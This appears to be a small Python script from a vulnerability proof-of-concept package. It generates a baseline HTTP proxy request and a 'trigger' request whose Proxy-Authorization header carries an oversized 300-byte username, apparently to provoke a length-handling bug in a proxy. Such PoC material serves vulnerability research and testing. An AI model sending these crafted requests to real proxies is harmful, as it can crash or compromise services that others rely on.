#!/usr/bin/env python3
"""Generate the exact baseline and trigger HTTP requests used by run.sh."""

import base64
import sys
from pathlib import Path


def request(username_size: int) -> bytes:
    credentials = b"A" * username_size + b":pw"
    authorization = base64.b64encode(credentials)
    return (
        b"GET http://peerstub/poc HTTP/1.1\r\n"
        b"Host: peerstub\r\n"
        b"Proxy-Authorization: Basic " + authorization + b"\r\n"
        b"Connection: close\r\n\r\n"
    )


if len(sys.argv) > 2:
    raise SystemExit("usage: make-poc.py [output-directory]")
output_dir = Path(sys.argv[1]) if len(sys.argv) == 2 else Path(__file__).parent
output_dir.mkdir(parents=True, exist_ok=True)
for name, size in (("baseline.http", 100), ("poc.http", 300)):
    (output_dir / name).write_bytes(request(size))
